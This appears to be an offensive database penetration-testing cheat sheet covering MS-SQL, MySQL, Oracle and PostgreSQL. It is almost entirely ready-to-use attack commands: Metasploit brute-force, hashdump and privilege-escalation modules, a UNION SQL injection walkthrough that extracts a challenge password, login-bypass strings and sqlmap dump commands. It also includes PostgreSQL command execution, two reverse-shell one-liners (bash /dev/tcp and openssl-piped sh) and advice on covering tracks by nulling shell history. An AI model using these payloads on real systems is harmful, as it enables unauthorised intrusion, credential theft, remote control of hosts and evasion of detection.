Databases

 
# MS-SQL

Locate
msf > use auxiliary/scanner/mssql/mssql_ping
nmap -sU -Pn -n -T4 --open -p1434 <targetRange>

nmap -p1433 --script ms-sql-info <targetIP>
nmap -p1433 --script ms-sql-brute --script-args mssql.instance-all,userdb=userlist.txt,passdb=wordlist.txt <targetIP>

msf > use auxiliary/scanner/mssql/mssql_login
msf > use auxiliary/admin/mssql/mssql_enum
msf > use auxiliary/scanner/mssql/mssql_hashdump
msf > use auxiliary/admin/mssql/mssql_escalate_dbowner

Post exploitation
msf > use auxiliary/admin/mssql/mssql_exec
------------------------------------------------------------------------------------------------------------------------------------------------------

# MySQL

mysql -h <IP> -u <username> -p <password>        Login remotely
mysql -h 10.0.0.10 -u root -p toor

CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password';
CREATE DATABASE <database>;
GRANT ALL PRIVILEGES ON <database>.* TO 'newuser'@'localhost';
FLUSH PRIVILEGES;

SHOW DATABASES;
USE <database>;
SHOW TABLES;
SHOW FIELDS FROM <table>;

DELETE FROM <table> WHERE <field>="value";

DROP DATABASE <database>;
DROP TABLE 'table1', 'table2', 'table3';
ALTER TABLE <table> DROP COLUMN <field>;

SELECT * FROM <table>;
SELECT * FROM <table> WHERE <field>="value";
SELECT LOAD_FILE('/etc/passwd')\g;

SET PASSWORD FOR username@localhost = PASSWORD('newpassword');

UPDATE <table> SET <field>="value";

INSERT INTO <table> VALUES('John', 'Smith', 'john.smith@acme.com');

DISTINCT <field>
GROUP BY <field>
LIMIT <number>
OFFSET <number>
ORDER BY <field>
WHERE <field> IS NOT NULL
WHERE <field> LIKE

\! whoami
\! sudo whoami
\! sudo bash

Examples:
SELECT * FROM hostvulns WHERE vulnerability LIKE "%Default%" ORDER BY vulnerability;
SELECT * FROM hosts WHERE host LIKE '%|%%' escape '|'
SELECT LENGTH(vulnerability), COUNT(*) FROM hostvulns GROUP BY LENGTH(vulnerability);
SELECT DISTINCT last_name,first_name FROM contacts WHERE first_name IS NOT NULL ORDER BY last_name;
SELECT DISTINCT email FROM contacts WHERE email LIKE "%@target.com" ORDER BY email
DELETE from profiles WHERE rowid='53';
UPDATE hostvulns SET tool="Nessus";

# MySQL Injection

# General.
1 UNION SELECT 1,2,3,4
1 UNION SELECT NULL,NULL,NULL,@@hostname         ubuntu
1 UNION SELECT NULL,NULL,NULL,version()          5.7.17-0ubuntu0.16.04.2
1 UNION SELECT NULL,NULL,NULL,current_user()     root@localhost
1 UNION SELECT NULL,NULL,NULL,user()             root@localhost
1 UNION SELECT NULL,NULL,NULL,UUID()             534c63c1-2e4a-11e9-bb88-00505692e5ab

# List all dbs.
1 UNION SELECT NULL,NULL,NULL,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES
    information_schema
    challenge
    mysql
    performance_schema
    sys

# List current db.
1 UNION SELECT NULL,NULL,NULL,database()
    challenge

# List tables in the current db.
1 UNION SELECT NULL,NULL,NULL,TABLE_NAME FROM information_schema.tables WHERE table_schema=‘challenge’
    comments
    users

# List column names in the table ‘comments’.
1 UNION SELECT NULL,NULL,NULL,CONCAT(TABLE_NAME,0x0A,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=‘comments’
    comments id
    comments username
    comments comment
    comments post_date

# List all the data in comments.
1 UNION SELECT NULL,NULL,NULL,CONCAT(id, 0x0A, username, 0x0A, comment, 0x0A, post_date, 0x0A) FROM comments

# List column names in the table ‘users’.
1 UNION SELECT NULL,NULL,NULL,CONCAT(TABLE_NAME,0x0A,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'
    users id
    users username
    users password
    users is_admin
    users signup_date
    users USER
    users CURRENT_CONNECTIONS
    users TOTAL_CONNECTIONS

# List all the data in users.
1 UNION SELECT NULL,NULL,NULL,CONCAT(username, 0x0A, password) FROM users
fl4gk33p3r	2DCsG47k5C77X5uMwIwO
Login > Profile > flag
------------------------------------------------------------------------------------------------------------------------------------------------------

# Oracle

1. Locate a system running Oracle.
2. Determine Oracle version.
3. Determine Oracle SID.
4. Guess/Bruteforce USERNAME/PASS.
5. Privilege escalation via SQL injection.
6. Manipulate data/post exploitation.
7. Cover tracks.


1. nmap -Pn -n -T4 --open -p1521 <target IP>

2. Example 1
     msf > use auxiliary/scanner/oracle/tnslsnr_version
     db_notes

   Example 2
     tnscmd10g version -h <target IP>
     tnscmd10g status -h <target IP>
     Look for the version, LOGFILE, TRACING and PORT.

3. Example 1
     msf > use auxiliary/scanner/oracle/sid_enum
     msf > use auxiliary/admin/oracle/sid_brute

   Example 2
     sidguess -i <target IP> -d /usr/share/metasploit-framework/data/wordlists/sid.txt

   Example 3
     http://<target IP>:8080/oradb/PUBLIC/GLOBAL_NAME

4. Example 1
     msf > use auxiliary/admin/oracle/login_brute
     set SID <sid>

   Example 2
     sqlplus <username>/<password>@<target IP>:<port>/<SID>

5. msf > use auxiliary/admin/oracle/sql
   set DBUSER <user>
   set DBPASS <password>
   set SID <sid>
   set SQL select * from user_role_privs

   msf > use auxiliary/admin/oracle/pushin/lt_findricset_cursor
   set DBUSER <user>
   set DBPASS <password>
   set SID <sid>
   set SQL GRANT DBA TO <user>
   set SQL GRANT JAVASYSPRIV TO <user>

6. select * from v$version;                      Oracle version
   select * from dba_registry_history;           Oracle patch level
   select * from all_users;                      Usernames
   select owner,table_name from all_tables;      Tables
   select * from session_roles;                  Session roles
   desc utl_http                                 Describes database objects

http://www.youtube.com/watch?v=SVvAvmjT7V4#t=1535

sqlplus user/password@target IP:1521/database
sqlplus user/password@target IP:1521/database as sysdba

select * from v$Version;                         Show the database version
select * from user_role_privs;                   Check database user permissions

./odat.pydbmsxslprocessor -s <target IP> -d <db> -U <user> -P <password> --putFile 'C:\inetpub\wwwroot\' 'test.txt' /root/test.txt --sysdba
curl https://target IP/test.txt
------------------------------------------------------------------------------------------------------------------------------------------------------

# Postgresql

psql -U <username> -h <IP> -d <database>
select username, passwd from pg_shadow;
select current_database();
create table test (input TEXT); copy test from '/etc/passwd'; select input from test;

psql -U postgres -h <IP>                         Login with user 'postgres' and no password
\l                                               List databases
\du                                              List database users
select pg_ls_dir('/etc');                        List directory contents of /etc
\c postgres                                      Connect to the 'postgres' db
\d                                               List of tables

create table tmp(data text);                     Create a table called 'tmp'
copy tmp(data) from program 'ls -l /home';       Run a command in the shell and save the output
select * from tmp;                               Print the contents of the table

copy tmp from '/etc/passwd';
select * from tmp;

delete from tmp;                                 Clear the table

Replace 'ls -l /home' with whatever command you'd like to run.
drop table tmp;

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
openssl s_client -quiet -connect <IP>:<port> | /bin/sh 2>&1 | openssl s_client -connect <IP>:<port>

Make sure to `export HISTFILE=/dev/null` when you get on, and `kill -9 $$` when you get off.

# Example

psql -U postgres -h <target IP> platforms
\c postgres
create table redteam(data text);
copy redteam from program 'bash -i >& /dev/tcp/172.16.1.1/4444 0>&1 &';
------------------------------------------------------------------------------------------------------------------------------------------------------

# SQL Injection

'+OR+1=1--
admin’;--
‘ or 1=1--
‘ or 2=2--
‘ or 2-1=1--
‘ or 2>1--
------------------------------------------------------------------------------------------------------------------------------------------------------

# sqlmap

sqlmap -r req.txt --level=5 --risk=3                                            Captured login using Burp
sqlmap -u "http://target/index.html?page=1" --dbs --dump --batch                Show all dbs
sqlmap -u "http://target/index.html?page=1" -D <db> --tables --dump --batch     Show all tables in a particular db
sqlmap -u "http://target/index.html?page=1" -D <db> -T <table> --dump           Dump all data in a particular table

